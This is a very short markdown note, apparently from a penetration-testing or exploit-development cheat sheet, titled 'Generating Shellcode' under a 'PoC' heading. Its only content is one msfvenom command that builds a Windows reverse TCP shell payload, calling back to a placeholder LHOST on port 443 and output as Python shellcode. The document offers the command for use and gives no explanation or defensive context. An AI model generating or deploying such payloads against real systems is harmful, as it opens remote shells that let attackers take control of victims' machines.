# Generating Shellcode

---

## PoC

```
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 EXITFUNC=thread -f python -v shell
```
